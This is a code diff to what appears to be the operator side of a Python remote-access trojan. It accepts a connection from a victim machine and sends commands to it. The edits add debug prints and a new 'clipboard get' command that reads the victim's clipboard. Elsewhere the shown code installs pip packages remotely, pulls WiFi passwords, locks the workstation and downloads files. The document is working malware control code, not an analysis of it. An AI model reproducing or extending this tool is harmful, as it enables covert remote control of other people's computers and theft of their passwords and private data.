@@ -41,6 +41,7 @@ conn, addr = listener.accept()
 print("[+] Connection established")
 
 def login():
+    global os
     while True:
         passwd = input("Login: ")
         conn.send(str.encode(passwd))
@@ -61,7 +62,10 @@ def login():
 
             print(bcolors.GREEN + logsuc)
             print(bcolors.YELLOW + 'Please Type HELP to know all custom commands')
+            print("ONE")
             os = str(conn.recv(1024), "utf-8")
+            print(os)
+            print("ONE")
             if "win" in os:
                 os = "WINDOWS MACHINE"
             elif "mac" in os:
@@ -90,7 +94,7 @@ def send_commands():
     while True:
         while True:
             cmd = input(">> ")
-            lcmd = cmd.lower()
+            lcmd = cmd.lower().strip()
             if cmd != "":
                 break
 
@@ -115,14 +119,13 @@ def send_commands():
         if lcmd == "help":
             help()
         if lcmd == "pipins":
-            x=4
-            while x==4:
+            while True:
                 module = input("What module would you like to install on the client machine? ")
                 module = module.lower()
                 if module == "quit":
                     quit()
                 cmd = "pip install " + module
-                x=5
+                break
         if "speak " in lcmd:
             conn.send(str.encode(lcmd))
         if lcmd == "wifipass" or lcmd == "wifi pass":
@@ -144,16 +147,22 @@ def send_commands():
                         print(bcolors.RED + final_wpass)
                         if wpass == "something":
                             wallow = 1
-        if lcmd == "lock" or lcmd == "lock ":
-            if "win" in os:
+        if lcmd.strip() == "lock":
+            print("TWO")
+            print(os)
+            print("TWO")
+            if "win" in os.lower():
                 cmd = 'Rundll32.exe user32.dll,LockWorkStation'
-            elif "mac" in os:
+            elif "mac" in os.lower():
                 cmd = 'pmset displaysleepnow'
             else:
                 print("Please note that this command has only been tested for windows and mac os")
                 cmd = 'pmset displaysleepnow'
-
-        if lcmd != "email" and lcmd != "help" and "speak " not in lcmd and read == 0 and wallow == 0:
+        if lcmd == "clipboard get":
+            conn.send(str.encode(lcmd))
+            clipboard = str(conn.recv(99999), "utf-8")
+            print(clipboard)
+        if lcmd != "help" and "speak " not in lcmd and read == 0 and wallow == 0:
             if lcmd == "download":
                 download_files()
 
